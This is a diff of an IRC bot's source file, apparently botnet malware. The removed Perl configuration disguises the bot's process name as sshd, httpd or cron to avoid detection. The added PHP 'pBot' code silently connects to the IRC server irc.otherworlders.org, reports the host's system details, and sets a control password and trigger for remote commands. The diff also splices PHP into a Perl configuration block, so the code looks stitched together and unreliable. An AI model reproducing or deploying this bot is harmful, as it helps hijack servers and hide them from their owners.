@@ -33,45 +33,40 @@
 ##### [ Configuration ] #####
 #############################
  
-my @rps = ("/usr/local/apache/bin/httpd -DSSL",
-           "/usr/sbin/httpd -k start -DSSL",
-           "/usr/sbin/httpd",
-           "/usr/sbin/sshd -i",
-           "/usr/sbin/sshd",
-           "/usr/sbin/sshd -D",
-           "/usr/sbin/apache2 -k start",
-           "/sbin/syslogd",
-           "/sbin/klogd -c 1 -x -x",
-           "/usr/sbin/acpid",
-           "/usr/sbin/cron");
-my $process = $rps[rand scalar @rps];
- 
-my @rversion = ("James Â®");
-my $vers = $rversion[rand scalar @rversion];
- 
-my @rircname = ("Linux");
- 
-my $ircname = $rircname[rand scalar @rircname];
- 
- 
-chop (my $realname = $rircname[rand scalar @rircname]);
- 
-my $nick =$rircname[rand scalar @rircname];
- 
-$server = 'irc.otherworlders.org' unless $server;
-my $port = '6667';
- 
-my $linas_max='8';
-my $sleep='5';
- 
-my $homedir = "/tmp";
-my $version = 'irc bot by James Â®';
- 
-my @admins = ("james","alex","bandit");
-my @hostauth = ("gov");
-my @channels = ("#Owny");
- 
-my $pacotes = 1;
+set_time_limit(0); 
+error_reporting(0); 
+echo "ok!";
+
+class pBot 
+{ 
+ var $config = array("server"=>"irc.otherworlders.org",
+                     "port"=>"6667",
+                     "pass"=>"",
+                     "prefix"=>"BTTZ",
+                     "maxrand"=>"4",
+                     "chan"=>"#Owny",
+                     "chan2"=>"#",
+                     "key"=>"",
+                     "modes"=>"+p",
+                     "password"=>"4231",
+                     "trigger"=>".",
+                     "hostauth"=>"*" // * for any hostname (remember: /setvhost xdevil.org)
+                     );
+ var $users = array(); 
+ function start() 
+ { 
+    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
+       $this->start(); 
+    $ident = $this->config['prefix'];
+    $alph = range("0","9");
+    for($i=0;$i<$this->config['maxrand'];$i++) 
+       $ident .= $alph[rand(0,9)];
+    if(strlen($this->config['pass'])>0) 
+       $this->send("PASS ".$this->config['pass']);
+    $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
+    $this->set_nick();
+    $this->main();
+ } 
  
 #################################################################
 ##### [ Stop Editing if you dont know what are you doing. ] #####
